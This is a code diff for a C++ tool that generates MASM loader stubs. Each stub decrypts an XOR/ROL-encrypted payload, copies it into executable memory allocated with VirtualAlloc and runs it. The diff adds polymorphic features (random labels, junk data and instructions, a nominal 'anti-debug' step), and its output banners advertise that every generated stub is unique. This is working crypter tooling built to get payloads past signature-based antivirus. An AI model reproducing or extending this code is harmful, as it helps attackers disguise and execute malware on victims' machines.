@@ -575,17 +575,20 @@ public:
             payload[i] = byte;
         }
         
-        // Generate MASM stub
-        std::string stub = R"(.386
-.model flat, stdcall
-option casemap:none
-
-include kernel32.inc
-includelib kernel32.lib
-
-.data
-    ; Encrypted payload ()" + std::to_string(payload.size()) + R" bytes)
-    payload db )";
+        // Generate unique MASM labels and variables
+        std::string payloadLabel = "payload_" + std::to_string(rng() % 10000);
+        std::string sizeLabel = "size_" + std::to_string(rng() % 10000);
+        std::string xorLabel = "xor_" + std::to_string(rng() % 10000);
+        std::string rolLabel = "rol_" + std::to_string(rng() % 10000);
+        std::string loopLabel = "loop_" + std::to_string(rng() % 10000);
+        std::string exitLabel = "exit_" + std::to_string(rng() % 10000);
+        
+        // Generate MASM stub with unique names
+        std::string stub = ".386\n.model flat, stdcall\noption casemap:none\n\n";
+        stub += "include kernel32.inc\nincludelib kernel32.lib\n\n";
+        stub += ".data\n";
+        stub += "    ; Encrypted payload (" + std::to_string(payload.size()) + " bytes)\n";
+        stub += "    " + payloadLabel + " db ";
         
         // Add encrypted payload bytes
         for (size_t i = 0; i < payload.size(); i++) {
@@ -596,70 +599,95 @@ includelib kernel32.lib
             }
         }
         
-        stub += R"(
-    payload_size equ $-payload
-    
-    ; Decryption keys
-    xor_key db )" + std::to_string((int)xorKey) + R"(h
-    rol_key db )" + std::to_string((int)rolKey) + R"(h
-
-.code
-start:
-    ; Get payload address
-    lea esi, payload
-    mov ecx, payload_size
-    mov al, xor_key
-    mov bl, rol_key
-    xor edx, edx        ; Position counter
-    
-decrypt_loop:
-    ; Load encrypted byte
-    mov ah, [esi]
-    
-    ; XOR with key and position
-    xor ah, al
-    xor ah, dl
-    
-    ; ROR to reverse ROL
-    mov cl, bl
-    ror ah, cl
-    
-    ; Store decrypted byte
-    mov [esi], ah
-    
-    ; Next byte
-    inc esi
-    inc edx
-    mov ecx, payload_size
-    cmp edx, ecx
-    jl decrypt_loop
-    
-    ; Allocate executable memory
-    push PAGE_EXECUTE_READWRITE  ; 40h
-    push MEM_COMMIT              ; 1000h  
-    push payload_size
-    push 0
-    call VirtualAlloc
-    test eax, eax
-    jz exit_stub
-    
-    ; Copy decrypted payload to executable memory
-    mov edi, eax        ; Destination (executable memory)
-    lea esi, payload    ; Source (decrypted payload)
-    mov ecx, payload_size
-    cld
-    rep movsb
-    
-    ; Execute payload
-    call eax
-    
-exit_stub:
-    ; Exit process
-    push 0
-    call ExitProcess
-
-end start
-)";
+        // Add unique variable definitions and code section
+        stub += "\n    " + sizeLabel + " equ $-" + payloadLabel + "\n\n";
+        stub += "    ; Decryption keys\n";
+        stub += "    " + xorLabel + " db " + std::to_string((int)xorKey) + "h\n";
+        stub += "    " + rolLabel + " db " + std::to_string((int)rolKey) + "h\n\n";
+        
+        // Add polymorphic junk data
+        int junkCount = rng() % 5 + 2;
+        for (int i = 0; i < junkCount; i++) {
+            stub += "    junk_" + std::to_string(i) + " db " + std::to_string(rng() % 256) + "h\n";
+        }
+        
+        stub += "\n.code\nstart:\n";
+        
+        // Add optional junk instructions
+        if (rng() % 2) {
+            stub += "    nop\n    xor eax, eax\n    inc eax\n    dec eax\n";
+        }
+        
+        stub += "    ; Get payload address\n";
+        stub += "    lea esi, " + payloadLabel + "\n";
+        stub += "    mov ecx, " + sizeLabel + "\n";
+        stub += "    mov al, " + xorLabel + "\n";
+        stub += "    mov bl, " + rolLabel + "\n";
+        stub += "    xor edx, edx        ; Position counter\n\n";
+        
+        stub += loopLabel + ":\n";
+        stub += "    ; Load encrypted byte\n";
+        stub += "    mov ah, [esi]\n\n";
+        
+        // Add polymorphic junk instructions
+        if (rng() % 2) {
+            stub += "    push ecx\n    pop ecx    ; Junk\n";
+        }
+        
+        stub += "    ; XOR with key and position\n";
+        stub += "    xor ah, al\n";
+        stub += "    xor ah, dl\n\n";
+        
+        stub += "    ; ROR to reverse ROL\n";
+        stub += "    mov cl, bl\n";
+        stub += "    ror ah, cl\n\n";
+        
+        stub += "    ; Store decrypted byte\n";
+        stub += "    mov [esi], ah\n\n";
+        
+        // Add more junk
+        if (rng() % 2) {
+            stub += "    nop\n";
+        }
+        
+        stub += "    ; Next byte\n";
+        stub += "    inc esi\n";
+        stub += "    inc edx\n";
+        stub += "    mov ecx, " + sizeLabel + "\n";
+        stub += "    cmp edx, ecx\n";
+        stub += "    jl " + loopLabel + "\n\n";
+        
+        stub += "    ; Allocate executable memory\n";
+        stub += "    push 40h               ; PAGE_EXECUTE_READWRITE\n";
+        stub += "    push 1000h             ; MEM_COMMIT\n";
+        stub += "    push " + sizeLabel + "\n";
+        stub += "    push 0\n";
+        stub += "    call VirtualAlloc\n";
+        stub += "    test eax, eax\n";
+        stub += "    jz " + exitLabel + "\n\n";
+        
+        stub += "    ; Copy decrypted payload to executable memory\n";
+        stub += "    mov edi, eax           ; Destination (executable memory)\n";
+        stub += "    lea esi, " + payloadLabel + "    ; Source (decrypted payload)\n";
+        stub += "    mov ecx, " + sizeLabel + "\n";
+        stub += "    cld\n";
+        stub += "    rep movsb\n\n";
+        
+        // Add anti-debug check
+        if (rng() % 2) {
+            stub += "    ; Simple anti-debug\n";
+            stub += "    push esp\n";
+            stub += "    pop esp\n";
+        }
+        
+        stub += "    ; Execute payload\n";
+        stub += "    call eax\n\n";
+        
+        stub += exitLabel + ":\n";
+        stub += "    ; Exit process\n";
+        stub += "    push 0\n";
+        stub += "    call ExitProcess\n\n";
+        stub += "end start\n";
         
         // Write MASM file
         std::ofstream asmFile(outputFile);
@@ -675,7 +703,7 @@ end start
         size_t stubSize = stub.length() + payload.size();
         bool under2KB = stubSize < 2048;
         
-        std::cout << "\n=== MASM Runtime Stub Generated ===" << std::endl;
+        std::cout << "\n=== MASM Runtime Stub Generated (UNIQUE) ===" << std::endl;
         std::cout << "✓ Output: " << outputFile << std::endl;
         std::cout << "✓ Payload size: " << payload.size() << " bytes" << std::endl;
         std::cout << "✓ Estimated stub size: " << stubSize << " bytes ";
@@ -683,6 +711,8 @@ end start
         std::cout << "✓ Encryption: XOR + ROL (assembly-optimized)" << std::endl;
         std::cout << "✓ XOR Key: 0x" << std::hex << (int)xorKey << std::dec << std::endl;
         std::cout << "✓ ROL Key: " << (int)rolKey << " bits" << std::endl;
+        std::cout << "✓ Unique labels: " << payloadLabel << ", " << loopLabel << ", " << exitLabel << std::endl;
+        std::cout << "✓ Polymorphic: " << junkCount << " junk data bytes added" << std::endl;
         
         std::cout << "\n=== Build Instructions ===" << std::endl;
         std::cout << "1. Assemble: ml /c /coff " << outputFile << std::endl;
@@ -697,6 +727,10 @@ end start
         std::cout << "• XOR + ROL encryption (fast)" << std::endl;
         std::cout << "• No C runtime dependencies" << std::endl;
         std::cout << "• Ultra-small footprint" << std::endl;
+        std::cout << "• UNLIMITED GENERATION: Every stub is unique!" << std::endl;
+        std::cout << "• Polymorphic code generation" << std::endl;
+        std::cout << "• Randomized variable names and labels" << std::endl;
+        std::cout << "• Junk instruction injection" << std::endl;
         
         return true;
     }
